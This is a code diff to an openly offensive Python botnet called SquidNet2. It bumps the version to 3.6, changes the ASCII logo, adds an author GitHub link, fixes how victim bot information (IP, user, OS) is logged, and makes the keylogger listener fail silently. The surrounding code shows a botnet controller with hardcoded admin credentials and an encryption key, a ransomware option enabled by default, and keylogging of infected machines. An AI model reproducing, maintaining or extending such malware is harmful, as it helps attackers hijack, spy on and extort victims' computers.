@@ -34,12 +34,12 @@ class BotNet:
                                || || ||
                                || || ||
                                || || ||
-  _________            .__    .||_||_||__          __  ________         ________       .________
- /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _\_____  \      |   ____/
- \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ / _(__  <      |____  \ 
- /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   / /       \     /       \\
-/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ /______  / /\ /______  /
-        \/    |__|             \/ || ||  \/     \/             \/              \/  \/        \/ 
+  _________            .__    .||_||_||__          __  ________         ________       ________
+ /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _\_____  \     /  _____/
+ \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ / _(__  <    /   __  \ 
+ /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   / /       \   \  |__\  \\
+/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ /______  / /\ \_____  /
+        \/    |__|             \/ || ||  \/     \/             \/              \/  \/       \/ 
                                || || ||
                                || || ||
                                || || ||
@@ -53,7 +53,7 @@ class BotNet:
                                  -__-
                                 /    \\
 Advanced Botnet By DrSquid
-        """
+[+] Github: https://github.com/DrSquidX"""
         return logo
     def __init__(self, ip, port, version, external_ip=None, external_port=None, admin_user="admin", admin_pass="adminpassword12345", logfile="log.txt", enc_key=b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=', ftp_dir="Bot_Files", ransomware_active=True):
         """Initiation of the class. Most of every important variable is mentioned here. This function is very important, 
@@ -329,8 +329,10 @@ Advanced Botnet By DrSquid
         except:
             os = "Unknown"
         self.botnum += 1
+        ogcontent = open(self.botinfofile,"r")
+        content = ogcontent.read()
         file = open(self.botinfofile,"w")
-        file.write(open(self.botinfofile,"r").read())
+        file.write(content)
         file.write(f"\n[+] Botname: {name}\n[+] IP: {ip}\n[+] Src Port: {srcport}\n[+] User: {osuser}\n[+] OS: {os}\n[+] Conn: {conn}\n")
         file.close()
         return [name, ip, srcport, osuser, os, conn]
@@ -4300,8 +4302,11 @@ class Bot:
     def on_release(self, key):
         pass
     def start_keylog(self):
-        with Listener(on_press=self.on_press, on_release=self.on_release) as L:
-            L.join()
+        try:
+            with Listener(on_press=self.on_press, on_release=self.on_release) as L:
+                L.join()
+        except:
+            pass
     def return_actual_dir(self, direc):
         return direc.replace("%user%",os.getlogin())
     def send(self, msg):
@@ -4516,7 +4521,7 @@ bot.initiate_connection()
         return payload
 class AutoUpdate:
     def __init__(self):
-        self.version = 3.5
+        self.version = 3.6
     def check_update(self):
         print(BotNet.logo(None))
         print("[+] Checking for updates.....")
@@ -4533,7 +4538,7 @@ class AutoUpdate:
         except:
             print("[+] There was an error with checking updates, starting SquidNet2.")
         if version > self.version:
-            print(f"[+] Your Version of SquidNet2 is outdated. You have version {self.version}, whereas the current update is version v{version}")
+            print(f"[+] Your Version of SquidNet2 is outdated. You have version {self.version}, whereas the current update is version v{version}.")
             update = input("\n[+] Do you wish to update?(y/n): ").lower()
             if update == "y" or update == "yes":
                 print(f"[+] Updating SquidNet2 to v{version}")
